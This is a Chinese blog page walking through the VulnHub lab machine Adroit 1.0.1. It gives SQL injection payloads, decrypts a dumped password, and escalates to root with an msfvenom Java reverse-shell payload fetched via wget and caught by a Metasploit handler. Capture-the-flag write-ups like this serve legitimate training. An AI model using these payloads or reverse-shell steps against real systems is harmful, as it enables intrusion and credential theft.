@@ -1,0 +1,591 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <meta name="description" content="准备： 攻击机：虚拟机kali、本机win10。 靶机：Adroit: 1.0.1，下载地址：https://download.vulnhub.com/adroit/Adroit-v1.0.1.ova" />
+    <meta property="og:description" content="准备： 攻击机：虚拟机kali、本机win10。 靶机：Adroit: 1.0.1，下载地址：https://download.vulnhub.com/adroit/Adroit-v1.0.1.ova" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>vulnhub靶场之ADROIT: 1.0.1 - upfine - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="//common.cnblogs.com/favicon.svg" type="image/svg+xml" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=1vhSwkIM_ZbH7FoBJEmvwqf4uVSvVLle9uQMPlPtd_s" />
+    
+
+    <link id="MainCss" rel="stylesheet" href="/skins/simplememory/bundle-simplememory.min.css?v=SiaEEyuLLyqQ30U6p0_gAunDLOqZtbt7kF5APbDruVo" />
+        <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/upfine/custom.css?v=nrFFK27TgjxZGuSJ4zgLV1mRG&#x2B;g=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/SimpleMemory/bundle-simplememory-mobile.min.css?v=foz1W_Fu2JAPmvBfSxSaxsHH-O7GuQn6sSOfgMtSLfY" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/upfine/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/upfine/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/upfine/wlwmanifest.xml" />
+    <script>
+        var currentBlogId = 753406;
+        var currentBlogApp = 'upfine';
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'SimpleMemory';
+        var visitorUserId = '';
+        var hasCustomScript = true;
+        try {
+            if (hasCustomScript && document.referrer && document.referrer.indexOf('baidu.com') >= 0) {
+                Object.defineProperty(document, 'referrer', { value: '' });
+                Object.defineProperty(Document.prototype, 'referrer', { get: function () { return ''; } });
+            }
+        } catch (error) { }
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 0;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false
+    </script>
+        <script>
+            var currentPostDateAdded = '2023-04-23 09:48';
+        </script>
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=QEG6LwSL2qZPG7UFsn5haCBlDMZ9Yzj6bWHw2T_YuXU"></script>
+    
+
+    
+</head>
+<body class="skin-simplememory no-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                            <img src="//common.cnblogs.com/logo.svg" alt="博客园Logo" />
+                    </a>
+                </li>
+                <li>
+                    <a href="/" onclick="countClicks('skin-navbar-sitehome')">首页</a>
+                </li>
+                <li>
+                    <a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a>
+                </li>
+                <li>
+                    <a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a>
+                </li>
+                    <li><a href="https://www.cnblogs.com/cmt/p/17320765.html" target="_blank">助园</a></li>
+                <li>
+                    <a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a>
+                </li>
+                <li>
+                    <a href="https://edu.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-edu')">班级</a>
+                </li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//common.cnblogs.com/images/blog/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="/images/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//common.cnblogs.com/images/blog/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'upfine', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//common.cnblogs.com/images/blog/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//common.cnblogs.com/images/blog/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//common.cnblogs.com/images/blog/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//common.cnblogs.com/images/blog/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//common.cnblogs.com/images/blog/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//common.cnblogs.com/images/blog/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <img id="navbar_lite_mode_on" src="/images/lite-mode-check.svg" class="hide" /><span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <!DOCTYPE html>
+<div lang="en">
+<div>
+    
+    <title>Title</title>
+</div>
+<div>
+<script type="text/javascript">
+ 
+    !function () {
+        //封装方法，压缩之后减少文件大小
+        function get_attribute(node, attr, default_value) {
+            return node.getAttribute(attr) || default_value;
+        }
+ 
+        //封装方法，压缩之后减少文件大小
+        function get_by_tagname(name) {
+            return document.getElementsByTagName(name);
+        }
+ 
+        //获取配置参数
+        function get_config_option() {
+            var scripts = get_by_tagname("script"),
+                script_len = scripts.length,
+                script = scripts[script_len - 1]; //当前加载的script
+            return {
+                l: script_len, //长度，用于生成id用
+                z: get_attribute(script, "zIndex", -1), //z-index
+                o: get_attribute(script, "opacity", 0.8), //opacity
+                c: get_attribute(script, "color", "255,255,255"), //color
+                n: get_attribute(script, "count", 350) //count
+            };
+        }
+ 
+        //设置canvas的高宽
+        function set_canvas_size() {
+            canvas_width = the_canvas.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+                canvas_height = the_canvas.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+        }
+ 
+        //绘制过程
+        function draw_canvas() {
+            context.clearRect(0, 0, canvas_width, canvas_height);
+            //随机的线条和当前位置联合数组
+            var e, i, d, x_dist, y_dist, dist; //临时节点
+            //遍历处理每一个点
+            random_points.forEach(function (r, idx) {
+                r.x += r.xa,
+                    r.y += r.ya, //移动
+                    r.xa *= r.x > canvas_width || r.x < 0 ? -1 : 1,
+                    r.ya *= r.y > canvas_height || r.y < 0 ? -1 : 1, //碰到边界，反向反弹
+                    context.fillRect(r.x - 0.5, r.y - 0.5, 1, 1); //绘制一个宽高为1的点
+                //从下一个点开始
+                for (i = idx + 1; i < all_array.length; i++) {
+                    e = all_array[i];
+                    // 当前点存在
+                    if (null !== e.x && null !== e.y) {
+                        x_dist = r.x - e.x; //x轴距离 l
+                        y_dist = r.y - e.y; //y轴距离 n
+                        dist = x_dist * x_dist + y_dist * y_dist; //总距离, m
+ 
+                        dist < e.max && (e === current_point && dist >= e.max / 2 && (r.x -= 0.03 * x_dist, r.y -= 0.03 * y_dist), //靠近的时候加速
+                            d = (e.max - dist) / e.max,
+                            context.beginPath(),
+                            context.lineWidth = d / 2,
+                            context.strokeStyle = "#000000",
+                            context.moveTo(r.x, r.y),
+                            context.lineTo(e.x, e.y),
+                            context.stroke());
+                    }
+                }
+            }), frame_func(draw_canvas);
+        }
+ 
+        //创建画布，并添加到body中
+        var the_canvas = document.createElement("canvas"), //画布
+            config = get_config_option(), //配置
+            canvas_id = "c_n" + config.l, //canvas id
+            context = the_canvas.getContext("2d-disabled"), canvas_width, canvas_height,
+            frame_func = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (func) {
+                window.setTimeout(func, 1000 / 40);
+            }, random = Math.random,
+            current_point = {
+                x: null, //当前鼠标x
+                y: null, //当前鼠标y
+                max: 20000 // 圈半径的平方
+            },
+            all_array;
+        the_canvas.id = canvas_id;
+        the_canvas.style.cssText = "position:fixed;top:0;left:0;z-index:" + config.z + ";opacity:" + config.o;
+        get_by_tagname("body")[0].appendChild(the_canvas);
+ 
+        //初始化画布大小
+        set_canvas_size();
+        window.onresize = set_canvas_size;
+        //当时鼠标位置存储，离开的时候，释放当前位置信息
+        window.onmousemove = function (e) {
+            e = e || window.event;
+            current_point.x = e.clientX;
+            current_point.y = e.clientY;
+        }, window.onmouseout = function () {
+            current_point.x = null;
+            current_point.y = null;
+        };
+        //随机生成config.n条线位置信息
+        for (var random_points = [], i = 0; config.n > i; i++) {
+            var x = random() * canvas_width, //随机位置
+                y = random() * canvas_height,
+                xa = 2 * random() - 1, //随机运动方向
+                ya = 2 * random() - 1;
+            // 随机点
+            random_points.push({
+                x: x,
+                y: y,
+                xa: xa,
+                ya: ya,
+                max: 6000 //沾附距离
+            });
+        }
+        all_array = random_points.concat([current_point]);
+        //0.1秒后绘制
+        setTimeout(function () {
+            draw_canvas();
+        }, 100);
+    }();
+</script>
+
+<!-- 悬挂的喵 -->
+<script type="text/javascript" src="https://blog-static.cnblogs.com/files/blogs/753406/szgotop.js" defer></script>
+<link rel="stylesheet" type="text/css" href="https://blog-static.cnblogs.com/files/blogs/753406/szgotop.css" />
+<div class="back-to-top cd-top faa-float animated cd-is-visible" style="top: -999px;"></div>
+
+
+</div>
+</div>
+
+
+    </div>
+
+    <!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/upfine/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/upfine/">upfine</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/upfine/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/upfine">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/upfine/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/upfine/p/17343188.html">
+    <span role="heading" aria-level="2">vulnhub靶场之ADROIT: 1.0.1</span>
+    
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<h1 id="autoid-0-0-0">准备：<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
+<p>攻击机：虚拟机kali、本机win10。</p>
+<p>靶机：Adroit: 1.0.1，下载地址：https://download.vulnhub.com/adroit/Adroit-v1.0.1.ova，下载后直接vbox打开即可。</p>
+<p>知识点：shell反弹（jar）、sql注入、简单的代码编写、逆向、dns解析。</p>
+<p>这个靶场比较推荐，因为之前做的大都是python、php的，这种java类的是很少遇到的，所以还是很有价值的，大家遇到有趣的靶场可以留言一起交流交流。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422153042026-1853734134.png"></p>
+<h1>一：信息收集</h1>
+<h2>1.nmap扫描</h2>
+<p>使用nmap扫描下靶机地址，命令：nmap -sn 192.168.0.0/24，发现靶机地址：192.168.0.13。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422153824314-527787101.png"></p>
+<p>使用nmap扫描下端口对应的服务：nmap -T4 -sV -p- -A 192.168.0.13，显示开放了21端口、22端口、3000端口、3306端口，开启了ssh服务、ftp服务、mysql服务。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422153923997-54009638.png"></p>
+<h2>2.ftp服务</h2>
+<p>在nmap的扫描结果中显示ftp服务可以匿名登录，那我们访问下ftp服务，发现三个文件：adroitclient.jar、note.txt、structure.PNG。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422154138648-841087222.png"></p>
+<p>查看下图片信息显示的应该是这个靶机的网络结构，note.txt文件是提示信息，但是现在不知道有什么用，先放在这。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422154322033-1170843827.png" height="245" width="590"></p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422154457307-2105784339.png" height="204" width="776"></p>
+<h1>二：逆向分析代码</h1>
+<p>对上面获得adroitclient.jar文件进行逆行，工具比较多就不一一列举了，这里就使用jd-gui这个工具了，使用jd-gui工具打开adroitclient.jar文件后包含四个java文件：AdroitClient.class、Cryptor.class、R.class、Idea.class。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422154809808-1479023528.png"></p>
+<p>对AdroitClient.class代码进行分析，得到建立连接使用的是adroit.local地址，因此我们需要进行dns解析，win：打开C:\Windows\System32\drivers\etc\hosts文件，添加：192.168.0.13 adroit.local。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423094601060-118030271.png"></p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422161852447-446890334.png"></p>
+<p>然后对下面代码继续分析发现userName=zeus，password=god.thunder.olympus，继续对代码分析后面是post和get两个请求方式，这里咱们选择get方式，然后是下面的核心代码，简单的分析了下，大致意思是让我们传递一个id值，然后将该信息传递到了上面图片中的socks服务端，然后在接受一个返回的response值。因为具体的socks服务端是如何做的不太清除，目前只能分析出来这么多。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422162044659-905261130.png"></p>
+<pre class="language-python highlighter-hljs"><code>request.setOption("get");
+System.out.println("Enter the phrase identifier : ");
+String inp = scanner.nextLine();
+String id = crypt.encrypt("Sup3rS3cur3Dr0it", inp);
+Idea idea = new Idea();
+idea.setId(id);
+request.setIdea(idea);
+os.writeObject(request);
+R responseobj = (R)is.readObject();
+String response = responseobj.getOption();
+System.out.println(response);</code></pre>
+<h1>三：SQL注入与解密</h1>
+<h2>1.sql注入</h2>
+<p>在本地执行下adroitclient.jar文件，命令：java -jar adroitclient.jar，然后按照要求输入账户、密码、请求方式、id信息，进行测试（这里向socks服务端发送的是idea类），但是没什么返回信息。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422162734605-645562394.png"></p>
+<p>后面想到他开启了mysql服务，这里是不是可能存在sql注入，然后就进行了测试，输入参数：1 union select 1,database()--，成功获得数据库信息：adroit。这里两个参数是因为idea类具有两个参数。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422162918738-1266306767.png"></p>
+<p>然后就是一直进行注入，获取数据库内的数据，执行步骤均同上只替换下最后的语句即可，最后成功获得加密的密码信息：l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=。</p>
+<pre class="language-python highlighter-hljs"><code>#获取数据库内表信息
+1 union select 1,concat(table_name) from information schema.tables where table schema='adroit'--
+#获取表内列信息
+1 union select 1,concat(column_name) from information_schema.columns where table_name='users'--
+#获取表内数据
+1 union select 1,concat(id,0x7c,username,0x7c,password,0x0a) from users--</code></pre>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230422164636737-938254346.png"></p>
+<h2>2.密码解密</h2>
+<p>对获得的加密字符串进行解密，解密的核心代码主要是Cryptor.class文件中的decrypt函数，解密后得到密码：just.write.my.ideas。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423090533415-207496724.png"></p>
+<pre class="language-python highlighter-hljs"><code>package com.company;
+
+import java.security.InvalidKeyException;
+import java.security.Key;
+import java.security.NoSuchAlgorithmException;
+import java.util.Base64;
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.spec.SecretKeySpec;
+
+public class Main {
+
+    public static void main(String[] args) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
+        String key = "Sup3rS3cur3Dr0it";
+        String text ="l4A+n+p+xSxDcYCl0mgxKrO15+OEC3aOfdrWafSqwpY=";
+        Key aesKey = new SecretKeySpec(key.getBytes(), "AES");
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(2, aesKey);
+        System.out.println(new String(cipher.doFinal(Base64.getDecoder().decode(text))));
+    }
+}</code></pre>
+<h2>3.获取shell</h2>
+<p>利用获得的账户和密码信息：writer/just.write.my.ideas进行ssh登录，成功获得shell权限。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423091132328-46611338.png"></p>
+<p>获得shell权限后在/home/writer目录下发现user.txt文件，读取该文件成功获得flag值。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423091306186-278537631.png"></p>
+<h1>四：提权</h1>
+<h2>1.查找利用点</h2>
+<p>查看下当前账户是否存在可以使用的特权命令，sudo -l，发现存在(root) /usr/bin/java -jar /tmp/testingmyapp.jar。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423092056839-127503391.png"></p>
+<h2>2.生成shell反弹jar包</h2>
+<p>那我们就可以生成一个进行shell反弹的java包testingmyapp.jar。这里可以使用idea、eclipse、msf均可以，我开始使用的是idea制作的jar包，但是因为本机（win）java版本太高，导致到靶机里没法执行，然后找了另一个虚拟机（kali，java版本较低，未对高版本进行测试）使用制作了一个testingmyapp.jar，命令：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=6688 W &gt;testingmyapp.jar。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423092237079-762302894.png"></p>
+<p>然后开启web服务，将该文件下载到靶机中，命令：python -m http.server和wget http://192.168.0.11:8000/testingmyapp.jar。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423092552183-1464512369.png"></p>
+<h2>4.msf利用获取root权限</h2>
+<p>然后在kali中启动msf并进行如下配置，做好配置之后在靶机的shell中已root权限启动testingmyapp.jar，命令：sudo /usr/bin/java -jar /tmp/testingmyapp.jar，成功获得root权限。</p>
+<pre class="language-python highlighter-hljs"><code>use exploit/multi/handler
+set payload java/meterpreter/reverse_tcp
+set LHOST 192.168.0.10 
+set LPORT 6688
+run</code></pre>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423093519302-269512084.png"></p>
+<p>获得root权限后在/root目录下发现root.txt文件，读取该文件成功获得flag值。</p>
+<p><img src="https://img2023.cnblogs.com/blog/2834847/202304/2834847-20230423093625292-2025848948.png"></p>
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0.20601619179050926" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2023-04-23 09:48">2023-04-23 09:48</span>&nbsp;
+<a href="https://www.cnblogs.com/upfine/">upfine</a>&nbsp;
+阅读(<span id="post_view_count">28</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=17343188" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(17343188);return false;">收藏</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '17343188', targetLink: 'https://www.cnblogs.com/upfine/p/17343188.html', title: 'vulnhub靶场之ADROIT: 1.0.1' })">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+
+<script>
+    var cb_entryId = 17343188, cb_entryCreatedDate = '2023-04-23 09:48', cb_postType = 1, cb_postTitle = 'vulnhub靶场之ADROIT: 1.0.1';
+    var allowComments = true, cb_blogId = 753406, cb_blogApp = 'upfine', cb_blogUserGuid = 'b7cfc392-d4b5-4993-37ca-08da18e9e3e4';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
+    updatePostStats(
+            [cb_entryId],
+            function(id, count) { $("#post_view_count").text(count) },
+            function(id, count) { $("#post_comment_count").text(count) })
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="under-post-card">
+            <div id='div-gpt-ad-1592365906576-0' style='width: 300px; height: 250px;'></div>
+    </div>
+    <div id="under_post_card1"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+                setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+                LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+	<div id="sideBar">
+		<div id="sideBarMain">
+			<div id="sidebar_news" class="newsItem">
+    <h3 class="catListTitle">公告</h3>
+<div id="blog-news">    
+    <div id="sidebar_news_content">
+    </div>
+</div>
+<script>loadBlogNews();</script>
+
+ 
+</div>
+<div id="sidebar_c3"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright &copy; 2023 upfine
+<br /><span id="poweredby">Powered by .NET 7.0 on Kubernetes</span>
+
+
+
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+
+    <div id="page_end_html">
+        <script src="https://blog-static.cnblogs.com/files/blogs/753406/bootstrap.min.js"></script>
+<link href="https://blog-static.cnblogs.com/files/blogs/753406/marvin.nav.my1502.css" rel="stylesheet">
+<script type="text/javascript" src="https://blog-static.cnblogs.com/files/blogs/753406/marvin.cnblogs.js"></script>
+<script type="text/javascript" src="https://blog-static.cnblogs.com/files/blogs/753406/marvin.nav.my1502.WhiteTears.js"></script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8M-opqJn5c1MsCC_BxLIULl5-xz11V8KDa38FeunnshvvoT5JyMcCGFHDRDoEK-dLFH1DOoXdn1KPLokqnSoxzhH6MygCNPVBuHbV-KZ097WBE10aflp5G8l6EBmhglPllbuHjEIrDEcXRrigqtsUec" />
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-476124-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    var kv = getGACustom();
+    if (kv) {
+        gtag('set', kv);
+    }
+    gtag('config', 'UA-476124-1');
+</script>
+<script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+</body>
+</html>
